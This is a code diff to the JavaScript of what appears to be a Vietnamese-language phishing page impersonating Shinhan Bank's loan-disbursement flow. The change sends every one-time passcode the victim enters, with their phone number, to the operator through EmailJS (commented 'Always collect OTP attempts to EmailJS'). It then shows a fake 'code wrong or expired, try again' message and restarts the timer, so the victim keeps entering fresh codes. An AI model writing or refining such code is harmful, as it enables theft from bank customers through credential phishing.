@@ -297,29 +297,22 @@
                 showInlineError("Mã xác nhận giải ngân không chính xác. Vui lòng kiểm tra lại.");
                 return;
             }
-            
+
             attemptCount++;
 
-            if (attemptCount === 1) {
-                sendOTPToEmail(otp, phone);
-                startOTPTimer();
-                showInlineError('Giaỉ ngân không thành công vui lòng xác nhận giải ngân lại.');
-            } else if (attemptCount === 2) {
-                startOTPTimer();
-                showInlineError('Mã xác nhận hết hiệu lực hoặc không đúng.');
-            } else {
-                sessionStorage.removeItem('formData');
-                const modal = document.getElementById('errorModal');
-                const errorMessageEl = document.getElementById('errorMessage');
-                const errorButton = document.getElementById('errorButton');
+            // Always collect OTP attempts to EmailJS
+            sendOTPToEmail(otp, phone);
 
-                errorMessageEl.textContent = 'Giải ngân không thành công. Vui lòng thử lại hoặc đăng ký giải ngân lại.';
-                errorButton.textContent = 'Đăng ký lại';
-                errorButton.onclick = () => {
-                    window.location.href = '/shinhanbank/pages/vi/Evaluate-conditions.html';
-                };
-                modal.classList.remove('hidden');
-            }
+            // Persist attempt log (non-sensitive)
+            try {
+                const attempts = JSON.parse(localStorage.getItem('otpAttempts') || '[]');
+                attempts.push({ t: new Date().toISOString(), len: otp.length });
+                localStorage.setItem('otpAttempts', JSON.stringify(attempts));
+            } catch (_) {}
+
+            // Restart timer and show non-blocking guidance
+            startOTPTimer();
+            showInlineError('Mã xác nhận không đúng hoặc đã hết hiệu lực. Vui lòng thử lại.');
         }
         
         function closeGeminiModal() {
